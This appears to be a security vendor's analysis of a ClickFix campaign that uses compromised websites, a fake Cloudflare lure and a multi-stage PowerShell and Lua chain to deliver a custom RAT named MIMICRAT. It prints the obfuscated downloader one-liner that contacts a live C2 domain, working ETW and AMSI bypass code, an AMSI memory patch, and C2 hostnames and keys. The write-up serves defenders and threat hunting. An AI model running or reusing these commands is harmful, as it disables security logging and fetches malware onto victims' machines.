justify-center lg:col-span-3"><div class="prose lg:prose-lg prose-invert w-full article-content"><div><h2 class="font-bold text-2xl md:text-4xl relative"><span id="introduction" class="absolute -top-32"></span>Introduction</h2>
<p>During a recent investigation, Elastic Security Labs identified an active ClickFix campaign compromising multiple legitimate websites to deliver a multi-stage malware chain. Unlike simpler ClickFix deployments that terminate at commodity infostealers, this campaign ends with a capable custom remote access trojan (RAT)  we have called <strong>MIMICRAT:</strong> a native C implant with malleable C2 profiles, token impersonation, SOCKS5 tunneling, and a 22-command dispatch table.</p>
<p>The campaign demonstrates a high level of operational sophistication: compromised sites spanning multiple industries and geographies serve as delivery infrastructure, a multi-stage PowerShell chain performs ETW and AMSI bypass before dropping a Lua-scripted shellcode loader, and the final implant communicates over HTTPS on port 443 using HTTP profiles that resemble legitimate web analytics traffic.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="key-takeaways" class="absolute -top-32"></span>Key takeaways</h3>
<ul>
<li>Multiple legitimate websites were compromised to deliver a five-stage attack chain.</li>
<li>The Lua loader executes embedded shellcode.</li>
<li><strong>MIMICRAT</strong> is a bespoke native C++ RAT with malleable C2 profiles, Windows token theft, and SOCKS5 proxy.</li>
</ul>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="discovery" class="absolute -top-32"></span>Discovery</h2>
<p>Elastic Security Labs first identified this campaign in early February 2026 through endpoint telemetry flagging suspicious PowerShell execution with obfuscated command-line arguments.</p>
<p></p>
<p>Given the novelty of the final payload, <a href="https://x.com/soolidsnakee/status/2021601599894819142">we publicly disclosed initial indicators via social media</a> on February 11, 2026 to ensure the broader security community could begin hunting for and defending against this threat while our full analysis was underway. The campaign remains active as of this publication.</p>
<p></p>
<p>Researchers at Huntress have <a href="https://www.huntress.com/blog/clickfix-matanbuchus-astarionrat-analysis">documented</a> related ClickFix campaigns using similar infrastructure and techniques, indicating the breadth of this threat actor&#x27;s operations across multiple parallel campaigns.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="campaign-delivery" class="absolute -top-32"></span>Campaign Delivery</h3>
<p>The campaign&#x27;s delivery relies entirely on compromising legitimate, trusted websites rather than attacker-owned infrastructure. The entry point for victims is bincheck[.]io, a legitimate Bank Identification Number (BIN) validation service. The threat actor compromised this site and injected a malicious JavaScript snippet that dynamically loads an external script hosted at <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">https://www.investonline[.]in/js/jq.php</code>, a second compromised site, a legitimate Indian mutual fund investment platform <strong>(Abchlor Investments Pvt. Ltd.)</strong>. The external script is named to impersonate the jQuery library, blending into the page&#x27;s existing resource load.</p>
<p>It is this remotely loaded script (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">jq.php</code>) that delivers the ClickFix lure: a fake Cloudflare verification page instructing the victim to manually paste and execute a command to &quot;fix&quot; a problem. The lure copies a malicious PowerShell command directly to the victim&#x27;s clipboard and prompts them to open a Run dialog (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Win+R</code>) or PowerShell prompt and paste it. This technique bypasses browser-based download protections entirely, as no file is downloaded.</p>
<p></p>
<p>This multidimensional compromise relies on a victim-facing website loading a malicious script from a second compromised website, distributes detection risk and increases the perceived legitimacy of the lure to both users and automated security tools. The campaign supports 17 languages, with the lure content dynamically localized based on the victim&#x27;s browser language settings to broaden its effective reach. Identified victims span multiple geographies, including a USA-based university and multiple Chinese-speaking users documented in public forum discussions, suggesting broad opportunistic targeting.</p>

<h2 class="font-bold text-2xl md:text-4xl relative"><span id="code-analysis" class="absolute -top-32"></span>Code analysis</h2>
<p>Once the victim executes the clipboard command, the campaign unfolds across five distinct stages: an obfuscated PowerShell downloader contacts the C2 to retrieve a second-stage script that patches Windows event logging(<a href="https://learn.microsoft.com/en-us/windows-hardware/test/wpt/event-tracing-for-windows">ETW</a>) and antivirus scanning(<a href="https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal">AMSI</a>) before dropping a Lua-based loader; the loader decrypts and executes shellcode entirely in memory; and the shellcode ultimately delivers <strong>MIMICRAT</strong>, a capable RAT designed for persistent access and lateral movement.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="stage-1-powershell-one-liner-command" class="absolute -top-32"></span>Stage 1 Powershell one liner command</h3>
<p>The clipboard-delivered command is a compact and obfuscated PowerShell one-liner:</p>
<pre><code>powershell.exe -WInDo Min $RdLU=&#x27;aZmEwGEtHPckKyBXPxMRi.neTwOrkicsGf&#x27;;$OnRa=($RdLU.Substring(17,12));$jOFn=.($RdLU[(87)/(3)]+$RdLU[19]+$RdLU[2]) $OnRa;$TNNt=$jOFn; .($TNNt.Remove(0,3).Remove(3))($TNNt); # connects to xMRi.neTwOrk</code></pre>
<p>The command uses string slicing and arithmetic index operations on a single seed string (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">aZmEwGEtHPckKyBXPxMRi.neTwOrkicsGf</code>) to reconstruct both the target domain and the invocation mechanism at runtime, avoiding any plaintext representation of the C2 domain or PowerShell cmdlet names in the initial payload. The window is minimized (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">-WInDo Min</code>). The extracted domain is <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">xMRi.neTwOrk</code>, which resolves to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">45.13.212.250</code>, and downloads a second-stage PowerShell script.</p>
<p>Infrastructure pivoting on <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">45.13.212.250</code> via VirusTotal relations revealed a second domain, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">WexMrI.CC</code>, resolving to the same IP. Both domains share the same mixed-case formatting obfuscation pattern.</p>
<p></p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="stage-2-obfuscated-powershell-script" class="absolute -top-32"></span>Stage 2 Obfuscated Powershell script</h3>
<p>The downloaded second-stage PowerShell script is significantly more elaborated. All strings are constructed at runtime by resolving arithmetic expressions to ASCII characters:</p>
<pre><code>$smaau = (-join[char[]](((7454404997-7439813680)/175799),(91873122/759282),...))
# Resolves to: &quot;System.Diagnostics.Eventing.EventProvider&quot;</code></pre>
<p>This technique renders the script opaque to static analysis and signature-based detection while remaining fully functional at runtime. A dummy class declaration is included as a decoy and<br/>
<!-- -->the script executes four sequential operations:</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="etw-bypass" class="absolute -top-32"></span>ETW Bypass</h4>
<p>The script accesses the internal <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">m_enabled</code> field of the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">System.Diagnostics.Eventing.EventProvider</code> class via reflection and patches its value to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">0</code>, effectively disabling Event Tracing for Windows and blinding PowerShell script block logging.</p>
<pre><code>[Reflection.Assembly]::LoadWithPartialName(&#x27;System.Core&#x27;).GetType(&#x27;System.Diagnostics.Eventing.EventProvider&#x27;).GetField(&#x27;m_enabled&#x27;,&#x27;NonPublic,Instance&#x27;).SetValue([Ref].Assembly.GetType(&#x27;System.Management.Automation.Tracing.PSEtwLogProvider&#x27;).GetField(&#x27;etwProvider&#x27;,&#x27;NonPublic,Static&#x27;).GetValue($null),0)</code></pre>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="amsi-bypass" class="absolute -top-32"></span>AMSI Bypass</h4>
<p>The script then uses reflection to access <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">System.Management.Automation.AmsiUtils</code> and sets the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">amsiInitFailed</code> field to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">$true</code>, causing PowerShell to skip all AMSI content scanning for the remainder of the session.</p>
<pre><code>[Ref].Assembly.GetType(&#x27;System.Management.Automation.AmsiUtils&#x27;).GetField(&#x27;amsiInitFailed&#x27;,&#x27;NonPublic,Static&#x27;).SetValue($null,$true)</code></pre>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="amsi---memory-patching" class="absolute -top-32"></span>AMSI - Memory Patching</h4>
<p>The script performs runtime method handle patching via <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Marshal.Copy</code> in an additional but less common defense evasion step overwriting method pointers in memory to redirect execution away from monitored code paths. This targets the function <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ScanContent</code> under <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">System.Management.Automation.AmsiUtils</code> to an empty generate method.</p>
<pre><code>$ScanContent_func = [Ref].Assembly.GetType(&quot;System.Management.Automation.AmsiUtils&quot;).GetMethods(&quot;NonPublic,Static&quot;) | Where-Object Name -eq &quot;ScanContent&quot;
$tttttttttt       = [zsZRXVIIMQvZ].GetMethods() | Where-Object Name -eq &quot;FHVcGSwOEM&quot;

[System.Runtime.InteropServices.Marshal]::Copy( @([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]$tttttttttt.MethodHandle.Value + [long]8)),
    0,
    [long]$ScanContent_func.MethodHandle.Value + [long]8,
    1
)</code></pre>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="payload-delivery" class="absolute -top-32"></span>Payload Delivery</h4>
<p>With event logging and AV scanning disabled, the script decodes a base64-encoded ZIP archive, extracts it to a randomly named directory under <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">%ProgramData%</code>/<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">knz_{random}</code>, and executes the contained binary <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">zbuild.exe</code>. Temporary artifacts are cleaned up post-execution.</p>
<pre><code>$extractTo = Join-Path $env:ProgramData (&quot;knz_{0}&quot; -f ([IO.Path]::GetRandomFileName()))
[IO.Compression.ZipFile]::ExtractToDirectory($tempZip, $extractTo)

<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="stage-3-lua-loader" class="absolute -top-32"></span>Stage 3 Lua loader</h3>
<p>The dropped binary is a custom Lua 5.4.7 loader. It embeds a Lua interpreter statically.<br/>
<!-- -->The binary decrypts an embedded Lua script using a XOR stub at runtime, then executes it. The XOR decryption routine (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">fxh::utility::lua_script_xor_decrypt</code>) iterates over the encrypted buffer XORing each byte against a key.</p>
<p></p>
<p>The Lua script implements a custom Base64 decoder with a non-standard alphabet to decode an embedded shellcode. The decoded shellcode is then allocated in executable memory via <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">luaalloc</code>, copied into that memory with <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">luacpy</code>, and finally executed via <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">luaexe</code>, achieving fully in-memory, fileless shellcode execution.</p>
<p></p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="stage-4-shellcode" class="absolute -top-32"></span>Stage 4 shellcode</h3>
<p>Shellcode matched Meterpreter-related signatures, suggesting the shellcode stage is a loader consistent with the Meterpreter code-family to reflectively load <strong>MIMICRAT</strong> into memory.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="stage-5-mimicrat" class="absolute -top-32"></span>Stage 5 MIMICRAT</h3>
<p>The final payload with compilation metadata set to <strong>January 29 2026</strong> is a native MSVC x64 PEcompiled with Microsoft Visual Studio linker version 14.44. It does not match any known open-source C2 framework exactly, implementing its own malleable HTTP C2 profiles with ASCII-character-based command dispatch and a custom architecture.</p>
<p></p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="c2-configuration-and-communication" class="absolute -top-32"></span>C2 Configuration and communication</h4>
<p><strong>MIMICRAT</strong>&#x27;s configuration is stored in the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.data</code> section. It contains cryptographic keys, connection parameters, and two complete HTTP communication profiles. All header strings and URIs are hex-encoded ASCII, and decoded at runtime.</p>
<p>The C2 operates over HTTPS on port 443 with a 10-second callback interval. The C2 server hostname (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">d15mawx0xveem1.cloudfront.net</code>) is RC4 encrypted with the following RC4 key <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">@z1@@9&amp;Yv6GR6vp#SyeG&amp;ZkY0X74%JXLJEv2Ci8&amp;J80AlVRJk&amp;6Cl$Hb)%a8dgqthEa6!jbn70i27d4bLcE33acSoSaSsq6KpRaA7xDypo(5</code>.</p>

<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">d15mawx0xveem1.cloudfront[.]net</code> is confirmed as part of <strong>MIMICRAT</strong>&#x27;s C2 infrastructure. VT relations for the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">rgen.zip</code> sample show it contacting this CloudFront domain using the same <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/intake/organizations/events?channel=app</code> URI pattern identified in <strong>MIMICRAT</strong>&#x27;s GET profile, confirming it acts as a C2 relay fronting for the backend server.</p>
